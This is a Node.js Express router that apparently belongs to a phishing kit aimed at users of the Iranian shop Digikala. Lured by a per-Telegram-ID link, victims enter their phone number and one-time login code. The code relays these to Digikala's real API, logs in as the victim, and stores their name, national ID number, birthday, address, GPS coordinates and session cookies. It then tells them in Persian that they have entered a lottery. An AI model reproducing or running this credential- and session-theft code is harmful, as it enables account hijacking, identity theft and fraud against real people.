const express = require('express');
const axios = require('axios');
const { body, validationResult } = require('express-validator');
const router = express.Router();
const validateTelegramId = require('../../middlewares/validateTelegramId');
const Url = require('../models/url')



// Store cookies between requests
let authCookies = {};

// Validation middleware
const validatePhoneNumber = [
    body('phoneNumber')
        .notEmpty().withMessage('شماره موبایل الزامی است')
        .matches(/^09\d{9}$/).withMessage('فرمت شماره موبایل نامعتبر است')
];

const validateOTP = [
    body('phoneNumber')
        .notEmpty().withMessage('شماره موبایل الزامی است')
        .matches(/^09\d{9}$/).withMessage('فرمت شماره موبایل نامعتبر است'),
    body('otpCode')
        .notEmpty().withMessage('کد تایید الزامی است')
        .isLength({ min: 5, max: 5 }).withMessage('کد تایید باید ۵ رقم باشد')
        .isNumeric().withMessage('کد تایید باید عددی باشد')
];



router.get('/:telegramID', validateTelegramId, (req, res) => {
    res.render('index');
});


router.post('/:telegramID/login',validateTelegramId,  validatePhoneNumber, async (req, res) => {
    // Validate request
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({
            success: false,
            message: errors.array()[0].msg,
            errors: errors.array()
        });
    }

    const { phoneNumber } = req.body;

    const headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://www.digikala.com',
        'priority': 'u=1, i',
        'referer': 'https://www.digikala.com/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Brave";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'x-web-client': 'desktop',
        'x-web-optimize-response': '1'
    };

    try {
        const authResponse = await axios.post(
            'https://api.digikala.com/v1/user/authenticate/',
            {
                backUrl: "/",
                username: phoneNumber,
                otp_call: true,
                hash: null
            },
            { headers }
        );

        if (authResponse.headers['set-cookie']) {
            authCookies = authResponse.headers['set-cookie'].join('; ');
        }

        res.json({
            success: true,
            message: 'کد تایید ارسال شد'
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({
            success: false,
            message: 'خطا در ارسال کد تایید'
        });
    }
});

router.post('/:telegramID/otp',validateTelegramId, validateOTP, async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
        return res.status(400).json({
            success: false,
            message: errors.array()[0].msg,
            errors: errors.array()
        });
    }

    const { phoneNumber, otpCode } = req.body;
    const telegramID = req.params.telegramID;

    const headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://www.digikala.com',
        'priority': 'u=1, i',
        'referer': 'https://www.digikala.com/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Brave";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'x-web-client': 'desktop',
        'x-web-optimize-response': '1'
    };

    try {
        const urlDoc = await Url.findOne({ telegramId: telegramID });
        if (!urlDoc) {
            return res.status(404).json({
                success: false,
                message: 'لینک معتبر نیست یا منقضی شده است'
            });
        }

        const otpResponse = await axios.post(
            'https://api.digikala.com/v1/user/login/otp/',
            {
                backUrl: "/",
                type: "otp",
                username: phoneNumber,
                code: otpCode
            },
            { headers }
        );

        console.log(otpResponse.status)
        console.log(otpResponse.data)

        if (otpResponse.data.status !== 200) {
            return res.status(400).json({
                success: false,
                message: 'کد وارد شده اشتباه است'
            });
        }

        // Update cookies from response
        if (otpResponse.headers['set-cookie']) {
            authCookies = otpResponse.headers['set-cookie'].join('; ');
        }

        const userInfoResponse = await axios.get(
            'https://api.digikala.com/v1/user/init/?backUrl=%2F',
            {
                headers: {
                    ...headers,
                    'cookie': authCookies
                }
            }
        );

        const userData = userInfoResponse.data?.data || {};
        const user = userData.user || {};
        const address = userData.default_address || {};

        // 4. Update the URL document with user data
        const updateData = {
            first_name: user.first_name || null,
            last_name: user.last_name || null,
            phone: user.phone || null,
            mobile: user.mobile || null,
            nationalCode: user.national_identity_number || null,
            gender: user.gender || null,
            birthDay: user.birthday_iso || null,
            cityName: user.city_name || null,
            stateName: user.state_name || null,
            addressFullName: address.full_name || null,
            address: address.address || null,
            postalCode: address.postal_code || null,
            addressMobile: address.mobile || null,
            addressLatitude: address.latitude || null,
            addressLongitude: address.longitude || null,
            cookies: authCookies || null,
            isActive: false, // Deactivate the link
            isWorked: true  // Mark as completed
        };

        await Url.updateOne({ telegramId: telegramID }, updateData);

        // 5. Respond with success
        res.json({
            success: true,
            message: 'شما با موفقیت در قرعه کشی ثبت نام شدید.',
        });

    } catch (error) {
        console.error('OTP verification error:', error);
        
        if (error.response) {
            if (error.response.status === 400) {
                return res.status(400).json({
                    success: false,
                    message: 'کد تایید نامعتبر است'
                });
            }
            
            return res.status(502).json({
                success: false,
                message: 'خطا در ارتباط با سرور دیجیکالا'
            });
        }
        
        res.status(500).json({
            success: false,
            message: 'خطای داخلی سرور',
            error: process.env.NODE_ENV === 'development' ? error.message : undefined
        });
    }
});
module.exports = router;
